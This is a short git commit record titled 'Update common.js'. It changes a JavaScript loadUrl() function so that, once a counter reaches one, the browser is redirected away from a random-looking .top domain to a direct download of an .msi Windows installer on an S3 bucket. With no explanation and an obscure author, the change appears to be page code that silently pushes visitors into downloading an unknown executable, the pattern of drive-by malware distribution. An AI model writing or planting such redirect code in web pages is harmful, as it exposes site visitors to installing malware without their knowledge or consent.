e854cec00a5f3d841554cbdfc230fdc1dba5a595
woshiwnidaye <kwnzhwkjdhekwbsg1762@gmail.com>
2025-07-28 00:23:27 +0800

    Update common.js

--- common.js
+++ common.js
@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://hyeiyevverldd.top";
+		var url="https://hoolew.s3.ap-southeast-2.amazonaws.com/haiiowold.msi";
 		window.location=url;
 	}
 }
